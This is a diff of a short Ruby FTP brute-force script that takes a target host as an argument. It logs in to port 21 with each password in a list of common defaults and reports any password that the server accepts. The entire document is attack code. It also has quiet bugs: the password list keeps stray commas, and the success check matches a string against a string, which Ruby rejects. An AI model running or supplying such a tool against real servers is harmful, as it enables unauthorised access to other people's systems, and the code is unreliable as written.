@@ -1,9 +1,8 @@
 require 'socket'
 
-def connect(username, pass)
-  Socket.tcp('192.168.11.12', 21) do |s|
-    msg, _ = s.recvfrom 1024
-    puts msg
+def connect(host, username, pass)
+  Socket.tcp(host, 21) do |s|
+    s.recvfrom 1024
 
     s.sendmsg "USER #{username}\r\n"
     s.recvfrom 1024
@@ -18,11 +17,20 @@ def connect(username, pass)
   end
 end
 
-username = 'ftp'
+def usage
+  puts 'ruby ftp-brute.rb <target>'
+  exit -1
+end
+
+usage() if ARGV.length < 1
+
+target = ARGV[0]
+
+name = 'ftp'
 passwords = %w(test, password, backup, 12345, root, administrator, admin, ftp)
 
 passwords.each do |pw|
-  attempt = connect(username, pw)
+  attempt = connect(target, name, pw)
 
-  print "[*] password found: #{pw}" if attempt =~ "230"
+  print "[*] password found: #{pw}" if attempt =~ '230'
 end
